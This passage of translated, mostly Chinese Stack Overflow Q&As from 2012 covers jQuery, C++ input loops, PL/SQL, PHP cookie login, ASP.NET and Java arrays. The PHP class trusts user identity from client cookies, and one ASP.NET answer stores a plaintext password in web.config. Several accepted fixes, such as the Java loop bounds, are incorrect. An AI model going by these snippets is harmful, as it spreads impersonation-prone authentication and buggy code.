<dt><strong><em><?php echo $this->__($option['label']); ?></em></strong></dt> 
```

它也可能是位于以下目录中的其他 tpl 文件之一，都有相同的问题：

```
\app\design\frontend\base\default\template\email\order\items\*\*.phtml 
```

# javascript - 将javascript插入到html文件中

> ID：13217587
> 
> 赞同：0
> 
> 时间：2012-11-04T09:58:16.340
> 
> 标签：javascript, html

我该如何运行这个脚本，试图在 html 文件中运行它，但它似乎不起作用..

我希望此代码位于单个 html 文件中，可以吗？还是我需要不同的文件？ [http://jsfiddle.net/ambiguous/jcnMa/1/](http://jsfiddle.net/ambiguous/jcnMa/1/)

```
<script type="text/javascript">
$('.question, .answer')
    .css("display", "none");
$('.section')
    .click(function ()
{
    var $others = $('.question:visible')
        .not(this);
    $others.next('.answer')
        .hide();
    $others.slideToggle(500);
    $(this)

        .next('.question')
        .slideToggle(500);
});
$('.question')
    .click(function ()
{
    $(this)
        .next('.answer')
        .slideToggle(500);
});​
</script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T10:23:05.897

首先确保您包含 jQuery 库：

```
<script src="path/to/jquery.min.js"></script> 
```

确保你没有在这些标签中包含 jQuery，所以你有：

```
<script src="path/to/jquery.min.js"></script>
<script>
    /* Your jQuery here */
</script> 
```

然后确保您使用的是`$(document).ready()`, or `$(window).load()`, 处理程序：

```
<script src="path/to/jquery.min.js"></script>
<script>
    $(document).ready(
        function(){
            /* Your jQuery here */
        });
</script> 
```

`$(document).ready()`(or )的要求`$(window).load()`是确保 DOM 已构建，并且存在要绑定事件的元素。如果没有这些处理程序，浏览器将在遇到您的脚本时尝试绑定事件，而无需等待元素存在或创建，这会导致事件绑定不起作用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T10:01:41.457

将此代码放在正文关闭标记之前

```
Your Code 
</body> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T10:52:51.497

我会这样：

```
<head>
    ...
    <script src="http://code.jquery.com/jquery-latest.min.js" type="text/javascript"></script>
    <script type="text/javascript">
        $(document).ready(function(){
            $('.question, .answer').css("display", "none");
            $('.section').click(function ()
            {
                var $others = $('.question:visible').not(this);
                $others.next('.answer').hide();
                $others.slideToggle(500);
                $(this).next('.question').slideToggle(500);
            });
            $('.question').click(function ()
            {
                $(this).next('.answer').slideToggle(500);
            });​
        });
    </script>
    ...
</head> 
```

首先，您需要确保 jquery lib 已加载，然后您可能会注意到您的代码引用了 DOM 中的对象，因此您只能在页面加载时（或在正文代码中输入它们之后）访问它们。我更喜欢尽可能将我的 js 代码存储在 head 部分。

# javascript - Webaudio API ScriptProcessorNode如何输出信号

> ID：13217589
> 
> 赞同：1
> 
> 时间：2012-11-04T09:58:49.177
> 
> 标签：javascript, web-audio-api

我想用 ScriptProcessorNode 接口处理音频，但我无法写入输出缓冲区。

```
var node = context.createScriptProcessor(256,1,1);
node.onaudioprocess = function (e){
        var inputBuffer = e.inputBuffer.getChannelData(0);
} 
```

我从 getChannelData 获取数据，但如何将它们发送到输出缓冲区？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-05T09:48:48.423

输出缓冲区存储在`e.outputBuffer`. 基本上，您可以更改其中的数据以设置输出的内容。

例如用随机数填充缓冲区

```
node.onaudioprocess = function (e) {
  var output = e.outputBuffer.getChannelData(0);
  for (var i = 0; i < output.length; i++) {
    output[i] = Math.random();
    // Math.random() sends random numbers, but you can make 
    // that be anything you want
  }
} 
```

*   例如：[播放生成的声音](https://stackoverflow.com/questions/13128107/play-back-generated-sounds)

# c++ - 虽然循环没有结束

> ID：13217592
> 
> 赞同：2
> 
> 时间：2012-11-04T10:00:33.300
> 
> 标签：c++, while-loop

我用几种方法重写了这个循环，使用嵌套的 If 和 do while，但行为是相同的。只要用户不输入字符或字符串，它就会按预期运行。一旦用户这样做，它就会继续旋转循环，直到我 CTRL+C 它。

根据我的研究，当一个变量是一个数字并且用户输入一个字符或字符串时，他们只是被转换成他们的 ASCII 数字，在这种情况下，while 检查应该起作用。该数字应该大于允许的值，并且应该提示用户输入新值，对吗？为什么它会无限循环？

宽度被声明为浮点数。

```
void setWidth ()
{
    std::cout << "\nPlease enter the width (use numbers greater than 0 and no greater than 20.0).\n";
    std::cin >> width;
    while (width <= 0 || width > 20)
    {
        std::cin.clear();
        std::cin.ignore();
        std::cout << "You have entered a number outside of the allowed range.\nPlease enter a number greater than 0 and no greater than 20.\n";
        std::cin >> width;
    }
} 
```

就像我说的，对于数字，它的效果很好，双打，负数，等等。但是像“asdf”或“a”这样的东西会把它放在无限旋转的循环中。

好像我什么都试过了。为什么会这样？我的意思是我知道它为什么会循环，这是因为数字不在 0 到 20 之间，但为什么它不要求用户输入？我确实清除了缓冲区。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-04T10:09:18.677

The line `std::cin >> width;` fails because the input isn't a number. It also doesn't consume any of the input, so you are stuck in an infinite loop.

To avoid this, you should read the input using [`std::getline()`](http://en.cppreference.com/w/cpp/string/basic_string/getline), then try to convert it (`std::ostringstream` is one option), handling and reporting failures accordingly.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-04T10:18:31.167

的默认值`cin.ignore()`是忽略单个字符。

如果您想忽略较长的字符串，则必须为此添加额外的参数，可能`cin.ignore(1000, '\n')`会跳过最多 1000 个字符或下一个换行符（以先到者为准）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-04T10:31:12.833

cin::clear() "Sets a new value for the error control state" [1](http://www.cplusplus.com/reference/iostream/ios/clear/)，但剩余的输入仍然在这里并且仍然可以读取。

然后我猜实际行为取决于编译器，因为当我用 g++ 4.6.3 编译它并输入输入“abc”时，它只循环了 3 次，然后等待另一个输入。

要清空 cin 缓冲区，您可能更愿意看到[如何刷新 cin 缓冲区？](https://stackoverflow.com/questions/257091/how-do-i-flush-the-cin-buffer)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-04T10:11:58.817

尝试检查[cin上的故障位](http://www.cplusplus.com/reference/iostream/istream/operator%3E%3E/)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-05T03:57:24.760

好的，感谢所有帮助人员......我终于设法让它与 cin （而不是 getline）一起工作，通过做我一直在做的事情，除了我做了一个 clearBuffer() 函数。因此，getWidth 函数不是从 getWidth 函数中清除缓冲区，而是调用另一个函数..从而让 getWidth 函数执行一些代码......然后返回运行其余部分......

由于某种原因，当它超出函数时它工作正常，字符串和字符触发错误..但是如果 cin.clear 和 cin.ignore 保留在函数内，那么我就有这个问题。

所以最终的代码看起来像这样。

```
void clearBuffer()
{
    std::cin.clear();
    std::cin.ignore(80, '\n'); //Ignore the first 80 characters up to an Enter character.
}

void setWidth ()
{
    std::cout << "\n\t\tPlease enter the width.\n(use numbers greater than 0 and no greater than 20.0).\n";
    float temp = NULL; //Using temp here so that we dont write invalid characters to an actual variable.
    std::cin >> temp;
    clearBuffer();
    while (temp <= 0 || temp > 20)
    {
        std::cout << "\nERROR: You have entered width outside of the allowed range.\nPlease enter a number greater than 0 and no greater than 20.\n";
        std::cin >> temp;
        clearBuffer();
    }
    if(temp > 0 && temp <= 20)
        width=temp;
} 
```

# html - 如何评论包含大量“--”或“>”的大量 HTML 标记？

> ID：13217597
> 
> 赞同：2
> 
> 时间：2012-11-04T10:01:30.303
> 
> 标签：html

> **可能重复：**
> [评论评论标记（嵌套评论）](https://stackoverflow.com/questions/12998915/commenting-a-commented-markup-nested-comments)

如何评论包含大量`--`或`>`（或`-->`）的大量 HTML 标记

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-11-04T10:06:00.220

如果它不包含任何`*/`内容，则可以将其包围

```
<script>
/*
Your html
*/
</script> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T10:05:06.090

是的，除非它包含`-->`

如果确实如此，并且您正在使用 PHP，那么这是一个技巧：

开始评论`<?php /*`，然后用 结束评论`*/?>`。

# sql - IF EXISTS 条件不适用于 PLSQL

> ID：13217600
> 
> 赞同：38
> 
> 时间：2012-11-04T10:01:53.173
> 
> 标签：sql, oracle, if-statement, plsql

当条件为 TRUE 时，我正在尝试打印 TEXT。选择代码工作正常。当我只运行选择代码时，它显示 403 值。但是当条件存在时，我必须打印一些文本。以下代码有什么问题。

```
BEGIN
IF EXISTS(
SELECT CE.S_REGNO FROM
COURSEOFFERING CO
JOIN CO_ENROLMENT CE
  ON CE.CO_ID = CO.CO_ID
WHERE CE.S_REGNO=403 AND CE.COE_COMPLETIONSTATUS = 'C' AND CO.C_ID = 803
)
THEN
    DBMS_OUTPUT.put_line('YES YOU CAN');
END; 
```

这是错误报告：

```
Error report:
ORA-06550: line 5, column 1:
PLS-00103: Encountered the symbol "JOIN" when expecting one of the following:

   ) , with group having intersect minus start union where
   connect
06550\. 00000 -  "line %s, column %s:\n%s"
*Cause:    Usually a PL/SQL compilation error.
*Action: 
```

* * *

## 回答 #1

> 赞同：67
> 
> 时间：2012-11-04T10:55:22.733

`IF EXISTS()`在语义上是不正确的。`EXISTS`条件只能在 SQL 语句中使用。所以你可以重写你的 pl/sql 块，如下所示：

```
declare
  l_exst number(1);
begin
  select case 
           when exists(select ce.s_regno 
                         from courseoffering co
                         join co_enrolment ce
                           on ce.co_id = co.co_id
                        where ce.s_regno=403 
                          and ce.coe_completionstatus = 'C' 
                          and ce.c_id = 803
                          and rownum = 1
                        )
           then 1
           else 0
         end  into l_exst
  from dual;

  if l_exst = 1 
  then
    DBMS_OUTPUT.put_line('YES YOU CAN');
  else
    DBMS_OUTPUT.put_line('YOU CANNOT'); 
  end if;
end; 
```

或者您可以简单地使用`count`函数 do 确定查询返回的行数和`rownum=1`谓词 - 您只需要知道记录是否存在：

```
declare
  l_exst number;
begin
   select count(*) 
     into l_exst
     from courseoffering co
          join co_enrolment ce
            on ce.co_id = co.co_id
    where ce.s_regno=403 
      and ce.coe_completionstatus = 'C' 
      and ce.c_id = 803
      and rownum = 1;

  if l_exst = 0
  then
    DBMS_OUTPUT.put_line('YOU CANNOT');
  else
    DBMS_OUTPUT.put_line('YES YOU CAN');
  end if;
end; 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-11-04T11:05:11.553

不幸的是，PL/SQL 没有`IF EXISTS`像 SQL Server 这样的运算符。但是你可以这样做：

```
begin
  for x in ( select count(*) cnt
               from dual 
              where exists (
                select 1 from courseoffering co
                  join co_enrolment ce on ce.co_id = co.co_id
                 where ce.s_regno = 403 
                   and ce.coe_completionstatus = 'C' 
                   and co.c_id = 803 ) )
  loop
        if ( x.cnt = 1 ) 
        then
           dbms_output.put_line('exists');
        else 
           dbms_output.put_line('does not exist');
        end if;
  end loop;
end;
/ 
```

# ruby-on-rails - 来自 Rails 的 Ajax 数据表

> ID：13217605
> 
> 赞同：0
> 
> 时间：2012-11-04T10:02:24.810
> 
> 标签：ruby-on-rails, datatables

嗨，我刚刚按照 Ryan Bates 指南在客户端与数据表交互时从服务器加载数据。

[http://railscasts.com/episodes/340-datatables?view=asciicast](http://railscasts.com/episodes/340-datatables?view=asciicast)

在他的 ProductsDatatable 类中，他定义了一个排序函数：

```
 def sort_column
    columns = %w[name category released_on price]
    columns[params[:iSortCol_0].to_i]
  end 
```

基本上列名是用来查询数据库的，所以“名称”、“类别”等都是产品模型的属性。因此生成了一个 SQL SELECT 语句，其中 Name 或 Category 用于对 ASC 或 DESC 进行排序......等等......

如果我的数据显示在未明确映射到属性的列中……例如 product.reviews.count，我将如何允许对该列进行排序？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T10:26:08.323

你需要这样的东西

```
def sort_column
    columns = ['name', 'category', 'released_on,' 'price', 'number_of_reviews]
    columns[params[:iSortCol_0].to_i]
  end 
```

但这意味着您需要更改获取数据的方式，例如：

```
Product.where(…).select('name, category, count(reviews.id) as number_of_reviews').group('name, category').includes('reviews') 
```

我无法测试 的定义`columns`，您可能必须`reviews.number_of reviews`改用

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-11-12T17:45:31.587

我知道这是一篇非常老的帖子（到目前为止），但只是想让您知道这个 gem：[https](https://github.com/antillas21/ajax-datatables-rails) ://github.com/antillas21/ajax-datatables-rails可以帮助您轻松快速开始创建数据表类，如所述在您提到的 Railscast 中（它实际上基于相同的模式）。

gem 所做的是让您专注于编写查询以从数据库中检索模型数据，以及如何在`jquery.dataTables`需要的 JSON 中公开它。

试一试。

# php - 使用cookies登录php

> ID：13217609
> 
> 赞同：0
> 
> 时间：2012-11-04T10:03:12.127
> 
> 标签：php, session, cookies

我有一个校内交易网站。该站点正在使用会话登录系统。我想在登录系统中添加 cookie。但是，由于我从未使用过 php cookie，因此由于某种原因系统无法正常工作。实际上没有记住（使用会话）系统可以正常工作，但它不适用于 cookie。

这是我在递增之前的课程：

```
class LoggedUser{
public static function GetUserId(){
    return $_SESSION['LoggedUser']['Id'];
}
public static function GetUserEmail(){
    return $_SESSION['LoggedUser']['Email'];
}
public static function LogInUser(
        $user_id,
        $user_email,
    ){
        $_SESSION['LoggedUser'] = array();
        $_SESSION['LoggedUser']['Id'] = $user_id;
        $_SESSION['LoggedUser']['Email'] = $user_email;

}
public static function IsUserLogged(){
    $result = false;
    if(isset($_SESSION['LoggedUser']))
        $result = true;
    return $result;
}
public static function LogOutUser(){
    unset($_SESSION['LoggedUser']);
}

} 
```

递增后：

```
class LoggedUser{
public static function GetUserId(){
    if(isset($_COOKIE['LoggedUserId']))
        return $_COOKIE['LoggedUserId'];
    return $_SESSION['LoggedUser']['Id'];
}
public static function GetUserEmail(){
    if(isset($_COOKIE['LoggedUserId']))
        return $_COOKIE['LoggedUserEmail'];
    return $_SESSION['LoggedUser']['Email'];
}
public static function LogInUser(
        $user_id,
        $user_email,
        $remember
    ){
    if($remember == true){
        setcookie("LoggedUserId", $user_id, time()+60*60*24*30);
        setcookie("LoggedUserEmail", $user_email, time()+60*60*24*30);
    }
    else{
        $_SESSION['LoggedUser'] = array();
        $_SESSION['LoggedUser']['Id'] = $user_id;
        $_SESSION['LoggedUser']['Email'] = $user_email;
    }
}
public static function IsUserLogged(){
    $result = false;
    if(isset($_COOKIE['LoggedUserId']))
        $result = true;
    if(isset($_SESSION['LoggedUser']))
        $result = true;
    return $result;
}
public static function LogOutUser(){
    unset($_COOKIE['LoggedUserId']);
    unset($_COOKIE['LoggedUserEmail']);
    unset($_SESSION['LoggedUser']);
}

} 
```

你知道为什么系统不能使用 cookie 吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T10:22:17.507

登录 PHP 文件是否在子目录中？

如果是这样，在 set cookie 命令中添加一个起始目录

```
setcookie("LoggedUserId", $user_id, time()+60*60*24*30, "/"); 
```

# uitableview - 最后一个 UITableViewCell 分成 3 个按钮

> ID：13217613
> 
> 赞同：0
> 
> 时间：2012-11-04T10:03:47.527
> 
> 标签：uitableview

我有一个表格视图作为我的应用程序的菜单。我希望最后一个单元格是 3 个按钮，类似于已分为 3 个部分的单元格。国家地理应用程序完全符合我的要求：

![在此处输入图像描述](../Images/ad83c2aee640a5a8146e78ba27844917.png)

我怎样才能让最后一个单元格类似于它的作用（三个 0 的区域）？任何帮助都会很棒！谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T10:16:03.353

只需在最后一个单元格中添加三个带有按钮的 UIView。在你的方法中：

```
cellForRowAtIndexPath 
```

创建标识符，一个用于简单单元格，一个用于最后一个单元格：

```
static NSString *SimpleCellIdentifier = @"simpleCell";
static NSString *LastCellIdentifier = @"lastCell"; 
```

提出条件：

```
if(indexPath.row == lestIndexCell) {
    //create last cell with "lastCell identyfier", and add subviews
    [cell addSubview:buttonView1];
    [cell addSubview:buttonView2];
    [cell addSubview:buttonView3];

} else {
    //create last cell with "simpleCell identyfier" 
```

# asp.net - ASP.NET Web.config encryption - temp files can't be accessed

> ID：13217616
> 
> 赞同：2
> 
> 时间：2012-11-04T10:04:17.777
> 
> 标签：asp.net, encryption, web-config

I have an asp.net application. There are secret parts contained in the web.config file which I want to protect through encryption. I'm using the ConfigurationSection.SectionInformation.ProtectSection method and later using WebConfigurationManager.Save to save it. Locally it works OK.

The problems is when it runs on the server, I get this error:

> System.Configuration.ConfigurationErrorsException: An error occurred loading a configuration file: (C:\Inetpub\vhosts(SiteName)\httpdocs\web.config) ---> System.UnauthorizedAccessException: Access to the path 'C:\Inetpub\vhosts(SiteName)\httpdocs\rz0fkykb.tmp' is denied.

This problems seems to take place because there is no write permission for the temp file which is obviously being created as part of encrypting the parts in web.config. I don't know the name of the temp file to be created and I don't want to give total write permission to the whole basic directory (security).

Is there a way to configure the path or the name of the tmp file created as side effect of the web.config encryption so I can isolate it and give to it (or to the custom specific directory) writing permissions?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T10:24:32.147

在`<system.web>`此代码下设置的 webconfig 文件中

```
 <identity impersonate="true" userName="your username of your current account"
        password="your  password" /> 
```

# java - 简单的线程池实现

> ID：13217618
> 
> 赞同：4
> 
> 时间：2012-11-04T10:04:52.797
> 
> 标签：java, concurrency, threadpool, java.util.concurrent

我想了解线程池的逻辑，下面有一个简单的不正确且不完整的实现：

```
class ThreadPool {
    private BlockingQueue<Runnable> taskQueue;

    public ThreadPool(int numberOfThreads) {
        taskQueue = new LinkedBlockingQueue<Runnable>(10);

        for (int i = 0; i < numberOfThreads; i++) {
            new PoolThread(taskQueue).start();
        }
    }

    public void execute(Runnable task) throws InterruptedException {
        taskQueue.put(task);
    }
}

class PoolThread extends Thread {
    private BlockingQueue<Runnable> taskQueue;

    public PoolThread(BlockingQueue<Runnable> queue) {
        taskQueue = queue;
    }

    public void run() {
        while (true) {
            try {
                taskQueue.take().run();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
} 
```

如果要执行的线程数超过了taskQueue的大小，调用线程会被阻塞吗？[ThreadPoolExecutor](http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/util/concurrent/ThreadPoolExecutor.java?av=f) - 在这里我们可以看到，在这种情况下，它是一个拒绝执行处理程序的工作，但我仍然无法理解它是如何工作的。提前感谢您的帮助。

**编辑：**

将阻塞队列的最大大小设置为 10

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-04T19:56:14.560

想象一群砌砖工（你的线程）正在建造一堵墙，还有一堆砖头（你的 BlockingQueue）。

每个瓦工从堆中取出一块砖，定位它，然后挑选另一个（taskQueue.take（）） - 直到堆中有砖，瓦工保持忙碌。

一辆卡车不时到达，用更多的砖填满堆 - 但堆上只有有限的空间，如果没有空间，卡车就会停下来等待砖匠用完足够的砖。

只要堆里有足够的砖块（超过砌砖工的数量），您就可以放心，所有砌砖工都会有足够的工作量 - 但是当堆开始变空时，砌砖工将不得不停止工作，直到交付新砖块。

您必须选择合适数量的砌砖工，数量少，卡车会经常在堆中等待空间，太多，他们中的大多数会闲置等待新砖。

在实现方面，一般来说，Java 为您提供了一个线程池，您很少创建自己的 -

```
 ExecutorService threadExecutor = Executors.newFixedThreadPool( 3 ); 
```

然后你打电话：

```
threadExecutor.submit(Runnable...); 
```

将任务添加到队列中。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-04T10:30:36.480

> 如果要执行的线程数超过了taskQueue的大小，调用线程会被阻塞吗？

队列的大小是未运行的任务数。通常，即使线程很忙，它也会为空。拥有与线程数匹配的队列长度没有意义，此时也没有什么特别的事情发生。

> 在这里我们可以看到，在这种情况下，它是被拒绝执行处理程序的工作

仅当队列已满时才调用拒绝处理程序。您的队列没有限制，因此即使您支持此功能也不会调用它。

但是，如果它确实有限制并且支持此功能，则典型行为是抛出异常。你可以让它做其他事情，比如阻塞，让当前线程运行任务（这是我的偏好）或忽略任务。

> 我仍然无法理解它是如何工作的。

当您将任务提供（）到队列时，如果队列不能接受它，它将返回 false。发生这种情况时，调用被拒绝的执行处理程序。

# javascript - How to get which commands are applyed on rich text box, JavaScript

> ID：13217627
> 
> 赞同：0
> 
> 时间：2012-11-04T10:06:50.473
> 
> 标签：javascript, html

I have a simple RichText Editor which contains standard operations (Bold|Italic|Underline, Text Alignment, Font type, color and size). I am using execCommand function in JavaScript (more [info](https://developer.mozilla.org/en-US/docs/Rich-Text_Editing_in_Mozilla#Executing_Commands)). So the command buttons are toggle buttons and when the mouse pointer is on the bold text (for example) how to make toggle button pressed. With other words - Has anyone idea how to get applied commands on the text to change the toggle button states. If I am not sufficiently detailed, ask me. Thanks for reading :)

# c# - How to remove the app name from a Windows Store App tile?

> ID：13217628
> 
> 赞同：1
> 
> 时间：2012-11-04T10:07:00.207
> 
> 标签：c#, windows-8

My tile already contains the title of my application. How can I set the title of the tile to nothing? When I just put a space or nothing in the DisplayName (Appmanifest) I get the following error:

```
App manifest validation failed. Value of attribute '/Package/Applications/Application/VisualElements/@DisplayName' cannot start or end with whitespace. 
```

(The guidelines say it is possible: [http://msdn.microsoft.com/en-us/library/windows/apps/hh465403.aspx#using_default_tiles](http://msdn.microsoft.com/en-us/library/windows/apps/hh465403.aspx#using_default_tiles))

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T11:34:11.320

知道了！在 appxmanifest 中，只需将 ShowName 更改为“noLogos”：

# jquery - 将元素的不同部分（如边框） 超链接到不同的链接

> ID：13217633
> 
> 赞同：1
> 
> 时间：2012-11-04T10:08:40.470
> 
> 标签：jquery, html, hyperlink, imagemap

在这个小提琴中：http: [//jsfiddle.net/peey/bbseQ/1/](http://jsfiddle.net/peey/bbseQ/1/)，我试图超链接一个由css制作的三角形（[使用这个片段](http://css-tricks.com/snippets/css/css-triangle/)），它基本上是一个元素的左边框。

如您所见，在小提琴中，超链接的实际区域包括第二个形状中显示的红色区域。

我正在寻找一种方法，我可以用它只超链接可见区域或右边框。我认为使用 jQuery 或纯 JavaScript 甚至其他一些 JavaScript 库可能是可能的，但我不确定如何。

此外，是否有任何方式可以将 HTML 图像映射与元素一起使用，因为如果可以，我可以使用它们来定义要超链接的区域。

谢谢你。

这是html代码：

```
<body>
I just want to link green, visible area    
<a href="#"><div class="arrow-right"></div></a>
But the actual hyperlinked area includes red:
<a href="#"><div class="arrow-right"></div></a>

<style>
.arrow-right{
    width: 0;
    height: 0;
    border-top: 60px solid transparent;
    border-bottom: 60px solid transparent;    
    border-left: 60px solid green;
}

a:last-child .arrow-right{
    background:red;
}
*{margin:10px;}
</style>
</body> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T10:45:48.627

你的问题很好，但为了解决它，我使用了一些数学。

假设边框的大小为 60：

```
var v = 60;
$('a').on("click", function(event){
    var x = event.pageX - $(this).offset().left;
    var y = event.pageY - $(this).offset().top;
    if((x==y || x<y) && x<v && (x+y)<v*2) {
        console.log(x+" "+y);
    } else {
        console.log('out!');
        return false;
    }
}); 
```

用于比较的等式将计算点击事件是否在箭头内。

演示在这里：http: [//jsfiddle.net/bbseQ/9/](http://jsfiddle.net/bbseQ/9/)

更新：也适用于 Firefox！干杯:)

# apache - Eclipse Juno EE NoClassDefFoundError when using external Jar

> ID：13217635
> 
> 赞同：0
> 
> 时间：2012-11-04T10:08:48.067
> 
> 标签：apache, jakarta-ee, eclipse-juno, apache-tika

I added an external jar in my eclipse dynamic webproject via Folder -> properties -> build path -> Libraries -> add external jar.

The code is working fine on compile time.

```
package servlet;
import java.io.IOException;
import java.io.PrintWriter;

import javax.servlet.ServletException;
import javax.servlet.annotation.MultipartConfig;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.tika.Tika;

@WebServlet(name="UploadServlet", urlPatterns={"/uploadFile"})     // specify urlPattern for servlet
@MultipartConfig                       //Specify that this servlet will receive a multipart data
public class UploadServlet extends HttpServlet {

    protected void doPost(HttpServletRequest req, HttpServletResponse res) throws IOException, ServletException{
        Tika tika = new Tika();

        res.setContentType("text/html");
        PrintWriter writer = res.getWriter();
        writer.write(mediaType);
    }
} 
```

I added Apache Tika but when I run my application. these exception occured.

```
root cause 

java.lang.NoClassDefFoundError: org/apache/tika/Tika
    servlet.UploadServlet.doPost(UploadServlet.java:19)
    javax.servlet.http.HttpServlet.service(HttpServlet.java:641)
    javax.servlet.http.HttpServlet.service(HttpServlet.java:722)

root cause 

java.lang.ClassNotFoundException: org.apache.tika.Tika
    org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1714)
    org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1559)
    servlet.UploadServlet.doPost(UploadServlet.java:19)
    javax.servlet.http.HttpServlet.service(HttpServlet.java:641)
    javax.servlet.http.HttpServlet.service(HttpServlet.java:722) 
```

I am using Apache Tika to determine what file has been upload, I want to use it for validating if a file is an image, or audio file

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-24T23:48:21.247

您忘记将该 jar 添加到部署程序集页面。当您运行应用程序时，它不会部署到服务器，因此会出现 NoClassDefFoundErrors。

# php - PHP Regex 制作 URL 的可点击链接并从自定义输入中提取链接标题

> ID：13217645
> 
> 赞同：1
> 
> 时间：2012-11-04T10:10:35.213
> 
> 标签：php, regex, url, hyperlink

我有一个自定义编辑用户界面，允许用户输入他们自己的 URL，到目前为止，我有正则表达式来查找 URL 并将它们全部转换为可点击的 html 链接。但我也想给用户输入他们自己的链接标题的选项，类似于 StackOverflow 上的格式：

[链接名称](http://www.yourlink.com/)

我将如何更改下面的代码以从括号中提取标题，从括号中提取 URL，并将常规 URL 转换为可点击的链接（即使他们只是输入[http://www.yourlink.com/](http://www.yourlink.com/)而没有标题)?

```
$text = preg_replace('/(((f|ht){1}tp:\/\/)[-a-zA-Z0-9@:%_\+.~#?&\/\/=]+)/i',
                       '<a href="\\1" target="_blank">\\1</a>', $text);
$text = preg_replace('/([[:space:]()[{}])(www.[-a-zA-Z0-9@:%_\+.~#?&\/\/=]+)/i',
                       '\\1<a href="http://\\2" target="_blank">\\2</a>', $text);
$text = preg_replace('/([_\.0-9a-z-]+@([0-9a-z][0-9a-z-]+\.)+[a-z]{2,3})/i',
                       '<a href="mailto:\\1">\\1</a>', $text); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-04T11:03:29.417

首先，您必须处理这些带有描述的链接，如下所示：

```
$text = preg_replace(
    '/\[([^\]]+)\]\((((f|ht){1}tp:\/\/)[-a-zA-Z0-9@:%_\+.~#?&\/\/=]+)\)/i',
    '<a href="\\2" target="_blank">\\1</a>', 
    $text
); 
```

但是现在，放置在 href 中的常规 URL 将在常规链接的下一次替换迭代中匹配，因此我们需要对其进行修改以将其排除，例如仅当它不以 开头时才匹配`"`：

```
$text = preg_replace(
    '/(^|[^"])(((f|ht){1}tp:\/\/)[-a-zA-Z0-9@:%_\+.~#?&\/\/=]+)/i',
    '\\1<a href="\\2" target="_blank">\\2</a>', 
    $text
); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T11:05:55.670

试试这个 ：

```
<?php
$text = "hello http://example.com sample
[Name of Link](http://www.yourlink.com/)
[Name of a](http://www.world.com/)
[Name of Link](http://www.hello.com/)
<a href=\"http://stackoverflow.com\">hello world</a>
<a href='http://php.net'>php</a>
";
echo nl2br(make_clickable($text));
function make_clickable($text) {
   $text = preg_replace_callback(
    '#\[(.+)\]\((\bhttps?://[^\s()<>]+(?:\([\w\d]+\)|([^[:punct:]\s]|)/))\)#', 
    create_function(
      '$matches',
      'return "<a href=\'{$matches[2]}\'>{$matches[1]}</a>";'
    ),
    $text
  );
  $text = preg_replace_callback('#(?<!href\=[\'"])(https?|ftp|file)://[-A-Za-z0-9+&@\#/%()?=~_|$!:,.;]*[-A-Za-z0-9+&@\#/%()=~_|$]#', create_function(
      '$matches',
      'return "<a href=\'{$matches[0]}\'>{$matches[0]}</a>";'
    ), $text);
  return $text;
} 
```

基于以下链接编写（编辑）：

[在文本块中使链接可点击的最佳方法](https://stackoverflow.com/questions/5341168/best-way-to-make-links-clickable-in-block-of-text)

[使用正则表达式使链接可点击](https://stackoverflow.com/questions/1242733/make-links-clickable-with-regex)

和 ...

# java - Java异常错误

> ID：13217646
> 
> 赞同：0
> 
> 时间：2012-11-04T10:10:39.630
> 
> 标签：java

我的教授让我用 Java 做以下作业，但我在尝试执行代码时出错。

请看一下代码，让我知道是什么导致了错误？代码保存到 Reverse.java 文件中。

```
package javaapplication44;
import java.util.Scanner;
public class Reverse {
    public static void main (String[] args) {
        String Fname[] = new String[4];
        Scanner s = new Scanner(System.in);
        for (int i=0; i<=4; i++) {
            System.out.println("\n Enter Something: ");
            Fname[i] = s.nextLine();
        }
        System.out.println ("*** The String has been Reversed ***");
        for (int i=4; i>0; i--) {
            System.out.println (Fname[i]);
        }
    }
} 
```

错误文字：

> 线程“main”中的异常 java.lang.ArrayIndexOutOfBoundsException: 4 at javaapplication44.Reverse.main(Reverse.java:14)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T10:22:16.517

当你取 4 个元素数组时，你必须计数小于 4 不小于等于 4。第一个循环将以 i< 4 为条件

而且第二个循环也将以 i>3 为条件

希望它会起作用

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T10:12:51.017

数组索引从零开始

改变

```
 for (int i=0; i<=4; i++) { 
```

到

```
 for (int i=0; i<4; i++) { 
```

另外，在您的第二个 for 循环中，从`i=3`

```
 for (int i=3; i>0; i--) { 
```

假设您的数组长度为 4，则最后一个索引为 3。

只要记住这一点：

```
 LastINdexOfAnArray = Array_Length -1; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T10:12:34.570

改变...

```
for (int i=0; i<=4; i++) { 
```

